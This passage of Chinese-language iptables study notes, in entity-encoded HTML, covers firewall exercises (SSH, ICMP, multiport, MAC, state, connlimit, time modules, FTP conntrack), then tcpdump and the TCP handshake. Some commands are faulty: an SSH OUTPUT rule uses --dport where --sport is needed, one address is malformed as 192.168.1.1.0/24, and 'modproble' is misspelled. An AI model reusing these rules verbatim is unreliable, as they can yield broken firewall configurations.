&#x5728;&#x81EA;&#x5B9A;&#x4E49;&#x94FE;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#x540E;&#x4F7F;&#x7528;&#x8FD4;&#x56DE;&#xFF0C;&#x6765;&#x8FD4;&#x56DE;&#x539F;&#x89C4;&#x5219;&#x94FE;&#x3002;</p>
<h3 id="&#x7EC3;&#x4E60;&#x9898;1&#xFF1A;">&#x7EC3;&#x4E60;&#x9898;1&#xFF1A;</h3>
<p>&#x53EA;&#x8981;&#x662F;&#x6765;&#x81EA;&#x4E8E;172.16.85.14&#x7684;&#x90FD;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;&#x6211;&#x672C;&#x673A;&#x7684;172.16.100.1&#x7684;SSHD&#x670D;&#x52A1;
&#x5206;&#x6790;&#xFF1A;&#x9996;&#x5148;&#x80AF;&#x5B9A;&#x662F;&#x5728;&#x5141;&#x8BB8;&#x8868;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x3002;&#x56E0;&#x4E3A;&#x4E0D;&#x9700;&#x8981;&#x505A;NAT&#x5730;&#x5740;&#x8F6C;&#x6362;&#x4E4B;&#x7C7B;&#x7684;&#xFF0C;&#x7136;&#x540E;&#x67E5;&#x770B;&#x6211;&#x4EEC;SSHD&#x670D;&#x52A1;&#xFF0C;&#x5728;22&#x53F7;&#x7AEF;&#x53E3;&#x4E0A;&#xFF0C;&#x5904;&#x7406;&#x673A;&#x5236;&#x662F;&#x63A5;&#x53D7;&#xFF0C;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;&#x8868;&#xFF0C;&#x9700;&#x8981;&#x6709;&#x4E00;&#x6765;&#x4E00;&#x56DE;&#x4E24;&#x4E2A;&#x89C4;&#x5219;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x5141;&#x8BB8;&#x4E5F;&#x597D;&#xFF0C;&#x62D2;&#x7EDD;&#x4E5F;&#x597D;&#xFF0C;&#x5BF9;&#x4E8E;&#x8BBF;&#x95EE;&#x672C;&#x673A;&#x670D;&#x52A1;&#xFF0C;&#x6211;&#x4EEC;&#x6700;&#x597D;&#x662F;&#x5B9A;&#x4E49;&#x5728;INPUT&#x94FE;&#x4E0A;&#xFF0C;&#x800C;OUTPUT&#x518D;&#x4E88;&#x4EE5;&#x5B9A;&#x4E49;&#x5C31;&#x597D;&#x3002;(&#x4F1A;&#x8BDD;&#x7684;&#x521D;&#x59CB;&#x7AEF;&#x5148;&#x5B9A;&#x4E49;)&#xFF0C;&#x6240;&#x4EE5;&#x52A0;&#x89C4;&#x5219;&#x5C31;&#x662F;&#xFF1A;
&#x5B9A;&#x4E49;&#x8FDB;&#x6765;&#x7684;&#xFF1A;</p>
<pre><code class="lang-bash">iptables -t filter -A INPUT <span class="hljs-operator">-s</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">16</span> <span class="hljs-operator">-d</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">100.1</span> -p tcp --dport <span class="hljs-number">22</span> -j ACCEPT
&#x5B9A;&#x4E49;&#x51FA;&#x53BB;&#x7684;&#xFF1A; iptables -t filter -A OUTPUT <span class="hljs-operator">-s</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">100.1</span> <span class="hljs-operator">-d</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">16</span> -p tcp --dport <span class="hljs-number">22</span> -j ACCEPT
&#x5C06;&#x9ED8;&#x8BA4;&#x7B56;&#x7565;&#x6539;&#x6210;DROP:
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP

<span class="hljs-number">1</span>&#x3001;&#x5141;&#x8BB8;ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &#x548C; &#x5141;&#x8BB8; ping <span class="hljs-number">10.1</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span> ,&#x5176;&#x4ED6;&#x670D;&#x52A1;&#x90FD;&#x7981;&#x6B62;

<span class="hljs-comment"># iptables -A INPUT -p icmp -i lo -j ACCEPT</span>
<span class="hljs-comment"># iptables -A INPUT -p icmp -s 10.1.1.0/255.255.255.0 -j ACCEPT</span>
<span class="hljs-comment"># iptables -A INPUT -j DROP</span>

&#x6216;&#x8005;
<span class="hljs-comment"># iptables -P INPUT DROP  &#x300A;&#xFF0D;&#xFF0D;&#x5B9A;&#x4E49;&#x9ED8;&#x8BA4;&#x7B56;&#x7565;&#xFF0C;&#x5F53;&#x5728;&#x89C4;&#x5219;&#x8868;&#x91CC;&#x627E;&#x4E0D;&#x5230;&#x5339;&#x914D;&#x7684;&#x89C4;&#x5219;&#x5C31;&#x91C7;&#x53D6;&#x7B56;&#x7565;&#x7684;&#x52A8;&#x4F5C;</span>
<span class="hljs-comment"># iptables -A INPUT -p icmp -i lo -j ACCEPT</span>
<span class="hljs-comment"># iptables -A INPUT -p icmp -s 10.1.1.0/255.255.255.0 -j ACCEPT</span>
</code></pre>
<p>2&#x3001;&#x53EA;&#x8FD0;&#x8BBF;&#x95EE;&#x672C;&#x673A;&#x7684;SSH&#x670D;&#x52A1;&#xFF08;&#x53EA;&#x5141;&#x8BB8;&#x8FDC;&#x7A0B;ssh&#x767B;&#x5F55;&#x5230;&#x672C;&#x673A;&#xFF09;</p>
<pre><code># iptables -P INPUT DROP
# iptables -A INPUT -p tcp --dport 22 -j ACCEPT  &lt;---&#x5B9A;&#x4E49;&#x7AEF;&#x53E3;&#x7684;&#x53C2;&#x6570; --dport
</code></pre><pre><code>&#x8FD8;&#x6709;&#x5C31;&#x662F;  
</code></pre><p>&#x5B9A;&#x4E49;&#x6E90;&#x7AEF;&#x53E3; --source-port  --sport
&#x5B9A;&#x4E49;&#x76EE;&#x7684;&#x7AEF;&#x53E3; --destination-port --dport</p>
<p>3&#x3001;&#x5B9A;&#x4E49;&#x8FDE;&#x7EED;&#x7AEF;&#x53E3;</p>
<pre><code>    iptables -A INPUT -p tcp --dport 20:100 -j ACCEPT  &lt;---&#x5141;&#x8BB8;&#x8BBF;&#x95EE; 20&#x5230;100&#x7684;&#x7AEF;&#x53E3;
</code></pre><p>4&#x3001;&#x5B9A;&#x4E49;&#x591A;&#x7AEF;&#x53E3; &lt;---&#x5F15;&#x5165;&#x4E00;&#x4E2A;&#x201C;&#x6A21;&#x5757;&#x201D;&#x7684;&#x6982;&#x5FF5;</p>
<pre><code>    iptables -A INPUT -m multiport -p tcp --dports  22,80,110 -j ACCEPT
        -m &#x6307;&#x5B9A;&#x6A21;&#x5757; 
        multiport &#x652F;&#x6301;&#x591A;&#x7AEF;&#x53E3;&#x7684;&#x6269;&#x5C55;&#x6A21;&#x5757;
</code></pre><p>5&#x3001;&#x5141;&#x8BB8;&#x548C;&#x5185;&#x7F51;&#x7684;&#x5BA2;&#x6237;(10.1.1.0/24)&#x8FDB;&#x884C;&#x4F20;&#x8F93;&#x6570;&#x636E;&#xFF08;&#x5305;&#x62EC;ping&#xFF09;</p>
<pre><code>    iptables -P INPUT DROP
    iptables -A INPUT -p ALL -i eth0  -s 10.1.1.0/24 -j ACCEPT
</code></pre><p>6&#x3001;&#x51B3;&#x7EDD;&#x8BBF;&#x95EE;&#x8272;&#x60C5;&#x7F51;&#x7AD9;www.baidu.com</p>
<pre><code>    iptables -A OUTPUT -d www.baidu.com  -j DROP
</code></pre><p>7&#x3001;&#x901A;&#x8FC7;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;</p>
<pre><code>    -m  mac  --mac-source [!] address
    iptables -A INPUT -m mac --mac-source 00:25:86:8E:AF:C8 -p icmp -j REJECT

    &#x6CE8;&#x610F;REJECT &#x548C; DROP &#x533A;&#x522B;
</code></pre><p>8&#x3001;&#x5B9A;&#x4E49;&#x8FDE;&#x7EED;&#x7684;IP&#x5730;&#x5740;</p>
<pre><code>    iptables -A INPUT  -m iprange --src-range 10.1.1.140-10.1.1.254 -j DROP
</code></pre><p>9&#x3001;&#x5BF9;&#x5916;&#x53EA;&#x5F00;&#x653E;web&#x670D;&#x52A1;&#xFF0C;&#x5176;&#x4ED6;&#x4E00;&#x5207;&#x4E0D;&#x653E;&#x884C;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;&#x8FDB;&#x6765;&#x4E5F;&#x4E0D;&#x5141;&#x8BB8;&#x51FA;&#x53BB;</p>
<pre><code># iptables -P OUTPUT DROP
# iptables -P INPUT DROP
# iptables -A INPUT -p tcp --dport 80 -j ACCEPT  &lt;--tcpdump tcp port 80 &#x53EA;&#x770B;&#x5230;&#x8FDB;&#x6765;&#x7684;&#xFF0C;&#x6CA1;&#x6709;&#x51FA;&#x53BB;&#x7684;
# iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED,RELATED -j ACCEPT
</code></pre><p>10&#x3001;&#x7EFC;&#x5408;&#x5E94;&#x7528;:</p>
<pre><code>&#x672C;&#x673A;&#x9700;&#x8981;&#x5F00;&#x653E;&#x7684;&#x670D;&#x52A1;&#x6709;&#xFF1A; ssh(22) &#x3001; web(80) &#x3001; ftp(21 20) &#x3001; DNS(53) &#x3001;pop3(110)&#x3001;pop3s(995)&#x3001;IMAP(143)&#x3001;IMAPS(993)&#x3001;smtp(25)&#x7B49;&#x670D;&#x52A1;&#x3002;
&#x5176;&#x4E2D;web &#x3001;ftp&#x3001;pop3&#x3001;pop3s&#x3001;IMAP&#x3001;IMAPS &#x5141;&#x8BB8;&#x6240;&#x6709;&#x7F51;&#x7EDC;&#x7684;&#x4EBA;&#x8BBF;&#x95EE;&#xFF1B;
ssh &#x53EA;&#x5141;&#x8BB8;&#x672C;&#x5730;&#x5C40;&#x57DF;&#x7F51;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;MAC&#x5730;&#x5740;&#x8BBF;&#x95EE;
&#x53EA;&#x5141;&#x8BB8;&#x672C;&#x5730;&#x5C40;&#x57DF;&#x7F51;&#x7684;&#x7528;&#x6237;&#x53D1;&#x9001;&#x90AE;&#x4EF6;
&#x53EA;&#x5141;&#x8BB8;&#x672C;&#x5730;&#x5C40;&#x57DF;&#x7F51;&#x7684;&#x7528;&#x6237;&#x67E5;&#x8BE2;DNS
</code></pre><pre><code># modprobe ip_conntrack_ftp
# iptables -P INPUT DROP
# iptables -P OUTPUT DROP
# iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# iptables -A INPUT -i lo -j ACCEPT
# iptables -A INPUT -p tcp -m multiport --destination-ports 20,21,80,110,143,993,995 -j ACCEPT
# iptables -A INPUT -m mac --mac-source 00:25:86:8E:AF:C8 -p tcp -s 10.1.1.0/24 --dport 22 -j ACCEPT
# iptables -A INPUT -p tcp --dport 25 -s 10.1.1.0/24 -j ACCEPT
# iptables -A INPUT -p tcp --dport 53 -s 10.1.1.0/24 -j ACCEPT
# iptables -A INPUT -p udp --dport 53 -s 10.1.1.0/24 -j ACCEPT
</code></pre><p>&#x7EC3;&#x4E60;&#x9898;icmp&#xFF1A;
icmp&#xFF1A;0 8
0&#xFF1A;&#x5E94;&#x7B54;&#x8BF7;&#x6C42;
8&#xFF1A;ping&#x8BF7;&#x6C42;
icmp&#x5BF9;&#x7167;&#x8868; 
&#x5047;&#x5982;&#x6211;&#x4EEC;&#x5141;&#x8BB8;&#x81EA;&#x5DF1;ping&#x522B;&#x4EBA;&#xFF0C;&#x4F46;&#x662F;&#x522B;&#x4EBA;ping&#x81EA;&#x5DF1;ping&#x4E0D;&#x901A;&#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x5462;&#xFF1F;
&#x5206;&#x6790;&#xFF1A;&#x5BF9;&#x4E8E;ping&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#xFF0C;&#x8FDB;&#x6765;&#x7684;&#x4E3A;8&#xFF08;ping&#xFF09;&#xFF0C;&#x51FA;&#x53BB;&#x7684;&#x4E3A;0(&#x54CD;&#x5E94;).&#x6211;&#x4EEC;&#x4E3A;&#x4E86;&#x8FBE;&#x5230;&#x76EE;&#x7684;&#xFF0C;&#x9700;&#x8981;8&#x51FA;&#x53BB;,&#x5141;&#x8BB8;0&#x8FDB;&#x6765;</p>
<pre><code>&#x5728;&#x51FA;&#x53BB;&#x7684;&#x7AEF;&#x53E3;&#x4E0A;&#xFF1A;iptables -A OUTPUT -p icmp --icmp-type 8 -j ACCEPT  
&#x5728;&#x8FDB;&#x6765;&#x7684;&#x7AEF;&#x53E3;&#x4E0A;&#xFF1A;iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT  
iptables -A OUTPUT -p icmp --icmp-type 8 -j ACCEPT  
iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT  
iptables -A OUTPUT -p icmp --icmp-type 0 -j DROP  
iptables -A INPUT -p icmp --icmp-type 8 -j DROP  
&#x5C0F;&#x6269;&#x5C55;&#xFF1A;&#x5BF9;&#x4E8E;127.0.0.1&#x6BD4;&#x8F83;&#x7279;&#x6B8A;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x660E;&#x786E;&#x5B9A;&#x4E49;&#x5B83;  
iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT  
iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT  
/lib/modules/2.6.18-194.el5/kernel/net/ipv4/netfilter/&#xFF1A;&#x5B58;&#x653E;&#x6A21;&#x5757;&#x7684;&#x4F4D;&#x7F6E;  
-m connlimit&#xFF1A;&#x6BCF;&#x4E2A;IP&#x7684;&#x5E76;&#x53D1;&#x8FDE;&#x63A5;&#x6570;(TCP) --&#x5173;&#x6CE8;&#x7684;&#x662F;&#x65B0;&#x53D1;&#x8D77;&#x7684;&#x8FDE;&#x63A5;&#xFF08;NEW --syn&#xFF09;  
mount -o loop rhel55.iso /mnt  
rpm -Uvh /mnt/Server/iptables-1.3.5-5.3.el5_4.1.i386.rpm  
iptables -t filter -A INPUT -s 192.168.1.115 -p tcp --dport 22 -m connlimit --connlimit-above 1 -j DROP  
iptables -t filter -A INPUT -s 192.168.1.115 -p tcp --dport 22 -m connlimit ! --connlimit-above 1 -j ACCEPT  
-m icmp&#xFF1A;ping&#x5305;&#x8BF7;&#x6C42;&#x4E0E;&#x53D1;&#x9001;  
[root@ ~]# iptables -A INPUT -p icmp -m icmp --icmp-type echo-reply -j ACCEPT  
[root@ ~]# iptables -A INPUT -p icmp -m icmp --icmp-type echo-request -j ACCEPT  
[root@ ~]# iptables -A INPUT -p icmp -j DROP  
[root@ ~]# iptables -A OUTPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT ==&amp;gt; 0 &#x76F8;&#x5F53;&#x4E8E; echo-reply  
[root@ ~]# iptables -A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT ==&amp;gt; 8 &#x76F8;&#x5F53;&#x4E8E; echo-request  
-m ipranges&#xFF1A;IP&#x8303;&#x56F4;  
[!] --src-range ip-ip Match source IP in the specified range  
[!] --dst-range ip-ip Match destination IP in the specified range  
[root@ ~]# iptables -t filter -A FORWARD -m iprange --src-range 192.168.1.1-192.168.1.100 -j ACCEPT  
[root@ ~]# iptables -t filter -A FORWARD -m iprange --dst-range 192.168.1.101-192.168.1.252 -j DROP  
-m limit&#xFF1A;&#x901F;&#x7387;&#x9650;&#x5236;  
[root@ ~]# watch iptables -L INPUT -nv  
[root@ ~]# iptables -A INPUT -s 192.168.1.115 -p icmp -m icmp --icmp-type echo-request -m limit --limit 1/second --limit-burst 1 -j ACCEPT  
[root@ ~]# iptables -A INPUT -s 192.168.1.115 -p icmp -m icmp --icmp-type echo-request -j DROP  
-m mac&#xFF1A;&#x5339;&#x914D;&#x6E90;&#x5730;&#x5740;&#x7684; MAC &#x5730;&#x5740;  
[root@ ~]# iptables -A INPUT -m mac --mac 00:0C:29:58:01:9A -p icmp -j DROP  
-m multiport&#xFF1A;&#x591A;&#x7AEF;&#x53E3;  
[root@ html]# iptables -A INPUT -s 192.168.1.0/24 -p tcp -m multiport --dport 22:25,25,110,80,53,21 -j DROP  
-m state(NEW/ESTABLISHED/RELATED/INVALID)&#xFF1A;  
NEW --&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x5305;&#xFF0C;&#x8DDF;TCP&#x72B6;&#x6001;&#x65E0;&#x5173;  
ESTABLISHED --&#x7B2C;&#x4E8C;&#x4E2A;&#x6570;&#x636E;&#x5305;  
RELATED --&#x5DF2;&#x7ECF;&#x53D1;&#x751F;&#x5173;&#x7CFB;&#x7684;&#x6570;&#x636E;&#xFF08;FTP&#xFF09;  
INVALID --&#x65E0;&#x6548;&#x6570;&#x636E;&#x5305;
</code></pre><h2 id="&#x4E2A;&#x4EBA;&#x7B80;&#x5355;&#x7684;&#x9632;&#x706B;&#x5899;&#xFF08;&#x72B6;&#x6001;&#xFF09;&#xFF1A;">&#x4E2A;&#x4EBA;&#x7B80;&#x5355;&#x7684;&#x9632;&#x706B;&#x5899;&#xFF08;&#x72B6;&#x6001;&#xFF09;&#xFF1A;</h2>
<p>ESTABLISHED &#x4E0D;&#x5141;&#x8BB8;&#x5176;&#x4ED6;&#x4E3B;&#x673A;&#x53D1;&#x8D77;&#x7684;&#x4E3B;&#x52A8;&#x8BBF;&#x95EE;&#xFF0C;&#x53EA;&#x5141;&#x8BB8;&#x672C;&#x5730;&#x4E3B;&#x673A;&#x4E3B;&#x52A8;&#x53D1;&#x8D77;&#x7684;&#x53D1;&#x529F;&#x80FD;&#x6587;&#x4EE5;&#x53CA;lo&#x901A;&#x8BAF;
[root@stu110 ~]# iptables -P INPUT DROP
[root@stu110 ~]# iptables -A INPUT -i lo -j ACCEPT
[root@stu110 ~]# iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
[root@stu110 ~]# iptables -A INPUT -p icmp -m state --state NEW -m limit --limit 1/second --limit-burst 3 -j ACCEPT
[root@stu110 ~]# iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
RELATED&#xFF1A;&#x5DF2;&#x53D1;&#x751F;&#x5173;&#x7CFB;&#x7684;
&#xFF08;1&#xFF09;vsftpd&#x6570;&#x636E;&#x4F20;&#x8F93;&#xFF08;&#x8003;&#x8651;&#x6A21;&#x5F0F;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;&#x4E3B;&#x52A8;&#x6A21;&#x5F0F;&#xFF09;</p>
<h3 id="&#x4E3B;&#x52A8;&#x6A21;&#x5F0F;&#xFF1A;">&#x4E3B;&#x52A8;&#x6A21;&#x5F0F;&#xFF1A;</h3>
<p>21 &#xFF0D;&#xFF0D;&#x63A7;&#x5236;&#x7AEF;&#x53E3;
20 &#xFF0D;&#xFF0D;&#x6570;&#x636E;&#x7AEF;&#x53E3;</p>
<h3 id="&#x88AB;&#x52A8;&#x6A21;&#x5F0F;&#xFF1A;">&#x88AB;&#x52A8;&#x6A21;&#x5F0F;&#xFF1A;</h3>
<p>21 &#xFF0D;&#xFF0D;&#x63A7;&#x5236;&#x7AEF;&#x53E3;
1024+ &#xFF0D;&#xFF0D;&#x6570;&#x636E;&#x7AEF;&#x53E3;
[root@mail ~]# insmod /lib/modules/2.6.18-164.el5xen/kernel/net/ipv4/netfilter/ip_conntrack_ftp.ko &#x9700;&#x8981;&#x6A21;&#x5757;&#x7684;&#x652F;&#x6301;&#xFF0C;&#x5185;&#x6838;&#x624D;&#x80FD;&#x652F;&#x6301; RELATED&#x72B6;&#x6001;
[root@mail ~]# iptables -t filter -A INPUT -p tcp --dport 21 -j ACCEPT
[root@mail ~]# iptables -t filter -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
&#x88AB;&#x52A8;&#x6A21;&#x5F0F;/&#x4E3B;&#x52A8;&#xFF1A;
service vsftpd start
iptables -A INPUT -p tcp -m multiport --dport 21 -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
modproble ip_conntrack_ftp --&#x52A0;&#x8F7D;FTP&#x72B6;&#x6001;&#x81EA;&#x52A8;&#x8DDF;&#x8E2A;&#x6A21;&#x5757;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x81EA;&#x52A8;&#x5207;&#x6362;&#x7AEF;&#x53E3;
-m string&#xFF1A;&#x5B57;&#x7B26;&#x4E32;&#x5185;&#x5BB9;&#x8FDB;&#x884C;&#x5339;&#x914D;&#xFF08;&#x5C40;&#x9650;&#x5927;&#xFF0C;&#x6548;&#x7387;&#x4F4E;&#xFF0C;&#x4E0D;&#x592A;&#x7528;&#xFF09;
[root@ ~]# iptables -A INPUT -s 192.168.1.8 -p tcp --dport 22 -m string --algo bm --string &quot;sex&quot; -j DROP
-m time&#xFF1A;&#x65F6;&#x95F4;&#x9650;&#x5236;
[root@ linux]# insmod /lib/modules/$(uname -r)/kernel/net/ipv4/netfilter/ipt_time.ko
[root@ linux]# iptables -t filter -A INPUT -s 192.168.1.1.0/24 -m time --timestart 9:00 --timestop 17:00 --days Mon,Tue,Wed,Thu,Fri -j ACCEPT
[root@ linux]# iptables -t filter -A INPUT -s 192.168.1.1.0/24 -p tcp --dport 80 -j DROP
<img src="https://upload-images.jianshu.io/upload_images/7342323-1de3dc87b6ebc3e4?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt=""></p>
<h2 id="&#x6293;&#x5305;&#x547D;&#x4EE4;">&#x6293;&#x5305;&#x547D;&#x4EE4;</h2>
<p>tcpdump port 80 -nn -v -S
tcpdump port 80 -nn -v -S
&#x4F4D;&#x7801;&#x5373;tcp&#x6807;&#x5FD7;&#x4F4D;,&#x6709;6&#x79CD;&#x6807;&#x793A;:
SYN(synchronous&#x5EFA;&#x7ACB;&#x8054;&#x673A;)</p>
<p>ACK(acknowledgement &#x786E;&#x8BA4;)</p>
<p>PSH(push&#x4F20;&#x9001;)</p>
<p>FIN(finish&#x7ED3;&#x675F;)</p>
<p>RST(reset&#x91CD;&#x7F6E;)</p>
<p>URG(urgent&#x7D27;&#x6025;)</p>
<p>Sequence number(&#x987A;&#x5E8F;&#x53F7;&#x7801;)</p>
<p>Acknowledge number(&#x786E;&#x8BA4;&#x53F7;&#x7801;)
&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x72B6;&#x6001;&#x610F;&#x4E49;:
LISTEN - &#x4FA6;&#x542C;&#x6765;&#x81EA;&#x8FDC;&#x65B9;TCP&#x7AEF;&#x53E3;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF1B;
SYN-SENT -&#x5728;&#x53D1;&#x9001;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x540E;&#x7B49;&#x5F85;&#x5339;&#x914D;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF1B;
SYN-RECEIVED - &#x5728;&#x6536;&#x5230;&#x548C;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x540E;&#x7B49;&#x5F85;&#x5BF9;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x7684;&#x786E;&#x8BA4;&#xFF1B;
ESTABLISHED- &#x4EE3;&#x8868;&#x4E00;&#x4E2A;&#x6253;&#x5F00;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x4F20;&#x9001;&#x7ED9;&#x7528;&#x6237;&#xFF1B;
FIN-WAIT-1 - &#x7B49;&#x5F85;&#x8FDC;&#x7A0B;TCP&#x7684;&#x8FDE;&#x63A5;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#xFF0C;&#x6216;&#x5148;&#x524D;&#x7684;&#x8FDE;&#x63A5;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x7684;&#x786E;&#x8BA4;&#xFF1B;
FIN-WAIT-2 - &#x4ECE;&#x8FDC;&#x7A0B;TCP&#x7B49;&#x5F85;&#x8FDE;&#x63A5;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#xFF1B;
CLOSE-WAIT - &#x7B49;&#x5F85;&#x4ECE;&#x672C;&#x5730;&#x7528;&#x6237;&#x53D1;&#x6765;&#x7684;&#x8FDE;&#x63A5;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#xFF1B;
CLOSING -&#x7B49;&#x5F85;&#x8FDC;&#x7A0B;TCP&#x5BF9;&#x8FDE;&#x63A5;&#x4E2D;&#x65AD;&#x7684;&#x786E;&#x8BA4;&#xFF1B;
LAST-ACK - &#x7B49;&#x5F85;&#x539F;&#x6765;&#x53D1;&#x5411;&#x8FDC;&#x7A0B;TCP&#x7684;&#x8FDE;&#x63A5;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x7684;&#x786E;&#x8BA4;&#xFF1B;
TIME-WAIT -&#x7B49;&#x5F85;&#x8DB3;&#x591F;&#x7684;&#x65F6;&#x95F4;&#x4EE5;&#x786E;&#x4FDD;&#x8FDC;&#x7A0B;TCP&#x63A5;&#x6536;&#x5230;&#x8FDE;&#x63A5;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x7684;&#x786E;&#x8BA4;&#xFF1B;
CLOSED - &#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#xFF1B;
TCP/IP&#x534F;&#x8BAE;&#x4E2D;&#xFF0C;TCP&#x534F;&#x8BAE;&#x63D0;&#x4F9B;&#x53EF;&#x9760;&#x7684;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#xFF0C;&#x91C7;&#x7528;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#xFF0C;&#x5982;&#x56FE;1&#x6240;&#x793A;&#x3002;</p>
<p>&#xFF08;1&#xFF09;&#x7B2C;&#x4E00;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x65F6;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;A&#x53D1;&#x9001;SYN&#x5305;&#xFF08;SYN=j&#xFF09;&#x5230;&#x670D;&#x52A1;&#x5668;B&#xFF0C;&#x5E76;&#x8FDB;&#x5165;SYN_SEND&#x72B6;&#x6001;&#xFF0C;&#x7B49;&#x5F85;&#x670D;&#x52A1;&#x5668;B&#x786E;&#x8BA4;&#x3002;</p>
<p>&#xFF08;2&#xFF09;&#x7B2C;&#x4E8C;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x670D;&#x52A1;&#x5668;B&#x6536;&#x5230;SYN&#x5305;&#xFF0C;&#x5FC5;&#x987B;&#x786E;&#x8BA4;&#x5BA2;&#x6237;A&#x7684;SYN&#xFF08;ACK=j+1&#xFF09;&#xFF0C;&#x540C;&#x65F6;&#x81EA;&#x5DF1;&#x4E5F;&#x53D1;&#x9001;&#x4E00;&#x4E2A;SYN&#x5305;&#xFF08;SYN=k&#xFF09;&#xFF0C;&#x5373;SYN+ACK&#x5305;&#xFF0C;&#x6B64;&#x65F6;&#x670D;&#x52A1;&#x5668;B&#x8FDB;&#x5165;SYN_RECV&#x72B6;&#x6001;&#x3002;</p>
<p>&#xFF08;3&#xFF09;&#x7B2C;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;A&#x6536;&#x5230;&#x670D;&#x52A1;&#x5668;B&#x7684;SYN&#xFF0B;ACK&#x5305;&#xFF0C;&#x5411;&#x670D;&#x52A1;&#x5668;B&#x53D1;&#x9001;&#x786E;&#x8BA4;&#x5305;ACK&#xFF08;ACK=k+1&#xFF09;&#xFF0C;&#x6B64;&#x5305;&#x53D1;&#x9001;&#x5B8C;&#x6BD5;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;A&#x548C;&#x670D;&#x52A1;&#x5668;B&#x8FDB;&#x5165;ESTABLISHED&#x72B6;&#x6001;&#xFF0C;&#x5B8C;&#x6210;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x3002;</p>
<p>&#x5B8C;&#x6210;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x5F00;&#x59CB;&#x4F20;&#x9001;&#x6570;&#x636E;&#x3002;
<img src="https://upload-images.jianshu.io/upload_images/7342323-77f6d5dccd673951?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="">
&#x56DB;&#x6B21;&#x6325;&#x624B;&#x662F;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;
